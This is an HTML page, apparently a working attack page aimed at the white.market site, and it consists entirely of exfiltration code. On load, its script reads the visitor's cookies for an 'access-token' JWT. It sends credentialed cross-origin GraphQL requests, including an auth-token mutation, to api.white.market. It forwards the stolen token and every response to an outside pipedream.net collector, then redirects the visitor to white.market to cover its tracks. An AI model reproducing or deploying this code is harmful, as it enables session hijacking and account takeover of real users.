<!DOCTYPE html>
<html>
<head><title>White Market</title></head>
<body>
<h1>Loading...</h1>
<div id="status"></div>
<script>
const status = document.getElementById('status');
const REQUESTBIN = 'https://eo5dlnbgif530n8.m.pipedream.net';

// Check cookies
const localCookies = document.cookie;
status.innerHTML = 'Checking cookies...<br>';

if (localCookies.includes('access-token')) {
    const jwt = localCookies.split(';').find(c => c.includes('access-token')).split('=')[1];
    status.innerHTML += 'JWT FOUND (direct theft)!<br>';
    fetch(REQUESTBIN + '?method=direct_cookie&jwt=' + encodeURIComponent(jwt.substring(0, 200)));
} else {
    status.innerHTML += 'No JWT in cookies<br>';
    fetch(REQUESTBIN + '?method=direct_cookie&result=no_cookie_leaked');
}

// Try multiple CORS queries
const queries = [
    {
        name: 'basic_query',
        query: 'query{__typename}',
        operationName: 'BasicQuery'
    },
    {
        name: 'auth_token_mutation',
        query: 'mutation AuthToken { auth_token { accessToken } }',
        operationName: 'AuthToken'
    }
];

queries.forEach(q => {
    fetch('https://api.white.market/graphql/api', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'x-accept-language': 'en_US'
        },
        body: JSON.stringify({
            query: q.query,
            operationName: q.operationName
        })
    })
    .then(r => r.json())
    .then(d => {
        console.log(q.name + ':', d);
        status.innerHTML += q.name + ': ' + JSON.stringify(d).substring(0, 100) + '...<br>';
        
        fetch(REQUESTBIN + '?method=' + q.name + '&data=' + encodeURIComponent(JSON.stringify(d)));
    })
    .catch(e => {
        console.error(q.name + ' error:', e);
        status.innerHTML += q.name + ' ERROR<br>';
    });
});

setTimeout(() => window.location.href = 'https://white.market', 8000);
</script>
</body>
</html>
